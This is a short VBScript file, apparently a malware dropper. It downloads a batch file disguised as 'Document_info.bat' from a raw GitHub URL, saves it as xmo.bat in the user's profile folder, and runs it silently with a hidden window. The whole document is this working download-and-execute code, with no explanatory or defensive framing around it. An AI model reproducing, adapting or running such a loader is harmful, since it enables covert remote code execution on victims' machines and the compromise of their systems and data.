url = "https://raw.githubusercontent.com/chotaacc/newss/main/Document_info.bat"

Set sh = CreateObject("WScript.Shell")
path = sh.ExpandEnvironmentStrings("%USERPROFILE%\xmo.bat")

Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
http.Open "GET", url, False
http.Send

If http.Status = 200 Then
Set stream = CreateObject("ADODB.Stream")
stream.Type = 1
stream.Open
stream.Write http.ResponseBody
stream.SaveToFile path, 2
stream.Close
sh.Run Chr(34) & path & Chr(34), 0, False
End If
